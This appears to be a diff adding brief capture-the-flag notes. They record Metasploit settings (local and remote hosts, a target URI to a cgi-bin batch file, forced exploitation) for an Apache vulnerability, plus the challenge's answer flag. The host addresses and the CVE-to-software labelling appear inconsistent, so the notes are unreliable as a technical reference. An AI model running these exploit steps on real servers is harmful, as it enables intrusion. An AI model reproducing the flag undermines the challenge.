@@ -1,0 +1,10 @@
+APACHE HTTP server vulnerability
+cve-2019-10098
+msfconsole
+ LHOST - 10.0.0.10 (our PC)
+ RHOST - 10.0.0.1 (the remote PC)
+TARGETURI => http://10.10.196.0/cgi-bin/elfwhacker.bat
+set ForceExploit TRUE
+run
+apache v. 9.0.17
+flag:thm{whacking_all_the_elves}
